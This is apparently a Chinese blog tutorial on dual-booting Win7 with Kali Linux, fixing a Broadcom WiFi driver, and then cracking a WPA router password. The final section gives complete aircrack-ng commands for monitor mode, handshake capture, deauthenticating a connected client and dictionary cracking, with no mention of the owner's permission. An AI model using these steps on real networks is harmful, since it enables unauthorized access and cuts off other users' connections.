第七节:win7+ kali linux双系统 + 无线路由WiFi破解
================================================

.. figure:: http://pic.58pic.com/58pic/15/11/65/64e58PICwJr_1024.jpg
   :alt: 

前期一：失败---原因：经过多方查文第一次安装Linux成功，但是引导失败，原因就是微软的Easybcd不怎么支持efi装的系统，支持legal的系统。于是经过二次实战。从中午1点半非连续装机半完美解决于下午2点50
win7+kali Linux双系统装成功，并进入了正确引导。

后期实战：问题：1)kali linux裸装后无WiFi驱动，无法连接wif;2）kali linux
裸装后有线由于没有netkeeper客户端，故不能上网，故首先解决问题---上网问题.

上网问题完美解决方案：1)经过尝试后，发现有线可以在机房通过chinanet进行连接，故走WiFi+有线连接方式，未配置dns及子网掩码之类的，便可以直接上网；2)使用ChinaNet连上网后，查文，翻墙，Google技术论坛，预解决kali
linux的无线网络连接问题-----首要安装无线驱动----经过命令后，得到本机的驱动为博通bcm43142

解决方案
--------

::

    1、编辑/etc/apt/sources.list 在文件最后加

    deb http://http.debian.net/debian/ jessie main contrib non-free
    ----------------2-5都是在端-----------------------
    2、 apt-get update

    3、apt-get install linux-headers-$(uname -r|sed 's,[^-]*-[^-]*-,,') broadcom-sta-dkms

    4、modprobe -r b44 b43 b43legacy ssb brcmsmac

    5、modprobe wl
    6、成功-------------以上来源debian官网

但是路途并不是这么畅通：使用apt-get命令过程中报错，解决方案： ###
1）系统更新

-  在sources.list中添加源 命令如下： ``leafpad /etc/apt/sources.list``

然后复制粘贴下面的源

::

    #阿里云kali源
    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb http://mirrors.aliyun.com/kali-security kali-rolling/updates main contrib non-free
    deb-src http://mirrors.aliyun.com/kali-security kali-rolling/updates main contrib non-free

    #中科大kali源
    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free
    deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free `

然后更新并安装

::

    `apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y  `

2)安装内核头
~~~~~~~~~~~~

直接使用上面源来升级内核

如下命令查看版本：

::

    ~# uname -r

这时候使用命令

::

    apt-get install linux-headers-$(uname -r)

这样就可以了，但是我实践的时候碰到下面问题

::

    命令：
    apt-get install linux-headers-$(uname -r)
    出现如下错误：
    E: Unable to locate package linux-headers-4.3.0-kali1-amd64
    E: Couldn't find any package by glob 'linux-headers-4.3.0-kali1-amd64
    E: Couldn't find any package by regex 'linux-headers-4.3.0-kali1-amd64

    翻遍Google,得到解决方案,如下:
    1.下载inux-kbuild,链接:(http://http.kali.org/kali/pool/main/l/linux-tools/)具体版本参见自己的主机；
    2.编译linux-kbuild;
    dkpg -i linux-kbuild-4.3_4.3.1-2kali1_amd64.deb

    3.下载linux-header-common和主机版本对应的linux-header。链接（http://http.kali.org/kali/pool/main/l/linux/）,具体版本参见自己的主机
    4.首先编译linux-header-common
    dkpg -i linux-headers-4.3.0-kali1-common_4.3.3-5kali4_amd64.deb
    5.最后编译linux-header
    dkpg -i linux-headers-4.3.0-kali1-amd64_4.3.3-5kali4_amd64.deb

于是乎，经过百般折腾后，WiFi启用成功！

网络之旅踏上新征程！

最后要实践的就是无线路由WiFi破解
--------------------------------

1）首先断开连接的wifi。
~~~~~~~~~~~~~~~~~~~~~~~

在终端中执行：

::

    # airmon-ng

上面命令列出了支持监控模式的无线网卡。如果没有任何输出，表示无线网卡不支持监控模式。你可以看到我的wlan0支持监控模式。

2）开启无线网卡的监控模式
~~~~~~~~~~~~~~~~~~~~~~~~~

::

    # airmon-ng start prism0

执行成功之后网卡接口变为prism0；可以使用ifconfig命令查看。

3）查看wifi网络
~~~~~~~~~~~~~~~

::

    # airodump-ng prism0

上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等。要记住要破解wifi的频道号和BSSID。
按Ctrl-C结束。

4）抓取握手包
~~~~~~~~~~~~~

使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包－也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包。
开始抓包：

::

    # airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ prism0

参数解释： -c指定频道号 –bssid指定路由器bssid -w指定抓取的数据包保存位置

5）强制连接到wifi的设备重新连接路由器
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

现在我们只要等用户连接/重连接wifi了，运气不好也许要很长时间。
但是我们是不会等的，这不是耐心黑客该干的事。有一个叫aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。
aireplay-ng的生效前提是，wifi网络中至少有一个连接的设备。从上图(4)可以看到哪些设备连接到了wifi，STATION就是连接设备的MAC地址，记住一个。
打开新终端执行：

::

    # aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C prism0

参数解释： -0指定发送反认证包的个数 -a指定无线路由器BSSID
-c指定强制断开的设备

如果成功：

按Ctrl-C结束抓包。
我们已经得到了想要的握手包了，可以结束无线网卡的监控模式了：

::

    # airmon-ng stop prism0

6) 开始破解密码
~~~~~~~~~~~~~~~

::

    # aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap

参数解释： -a2代表WPA的握手包 -b指定要破解的wifi BSSID。 -w指定字典文件
最后是抓取的包

附录
----

1.实践中apt之类的命令报错
~~~~~~~~~~~~~~~~~~~~~~~~~

请更新源，我当初尝试安装flash报错就是这样解决的;

2.参考文章
~~~~~~~~~~

http://www.linuxdiyf.com/linux/24060.html
http://blog.csdn.net/wei83523408/article/details/50621180
http://blog.csdn.net/chen86860/article/details/52034365
http://www.mottoin.com/88941.html

最后感谢各位道友的帮助，耗时半天的征程划伤圆满的句号！
